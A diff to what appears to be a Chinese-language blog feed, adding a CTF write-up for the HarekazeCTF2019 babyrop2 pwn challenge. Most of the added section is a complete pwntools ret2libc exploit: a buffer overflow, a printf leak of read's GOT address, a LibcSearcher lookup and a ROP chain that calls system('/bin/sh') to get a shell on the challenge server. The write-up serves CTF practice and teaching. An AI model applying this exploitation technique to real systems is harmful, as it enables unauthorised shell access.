@@ -5841,6 +5841,23 @@
 
 <p>这个代码在执行时会查到好几个版本的Libc，其中选择的是标号为2的可以拿到shell</p>
 <p><img src="image-20201107221552664.png" alt="image-20201107221552664"></p>
+<h2 id="HarekazeCTF2019-babyrop2"><a href="#HarekazeCTF2019-babyrop2" class="headerlink" title="HarekazeCTF2019_babyrop2"></a>HarekazeCTF2019_babyrop2</h2><p>首先checksec</p>
+<p><img src="image-20201107222717630.png" alt="image-20201107222717630"></p>
+<p>64位程序开启了NX</p>
+<p>反编译main函数之后</p>
+<p><img src="image-20201107222819665.png" alt="image-20201107222819665"></p>
+<p>溢出点在read函数</p>
+<p>和之前的区别在于这个是要使用printf泄漏出libc的地址</p>
+<p>在程序中搜索格式化字符串，搜到了<code>%s</code></p>
+<p><img src="image-20201107232442853.png" alt="image-20201107232442853"></p>
+<p>在调用printf函数的时候至少需要两个参数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,got_read);</span><br></pre></td></tr></table></figure>
+
+<p>所以除了<code>pop rdi</code>还需要<code>pop rsi</code></p>
+<p>之后就首先用printf泄漏出 read在got表的地址，之后回到main函数重新执行，通过libc的版本计算出<code>system</code>和<code>/bin/sh</code>的偏移后调用拿到shell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29161</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span></span><br><span class="line"></span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">plt_printf = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_s = <span class="number">0x400790</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(printf_s) + p64(pop_rsi_r15) + p64(got_read) + p64(<span class="number">0</span>) +p64(plt_printf) + p64(main)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;again, &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">real_read = u64(io.recvuntil(<span class="string">&#x27;!&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(address=real_read, func=<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = real_read - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>两个libc中标号为1的可以拿到shell，flag被爆存在了<code>/home/babyrop2/flag</code></p>
 ]]></content>
       <categories>
         <category>buuctf</category>
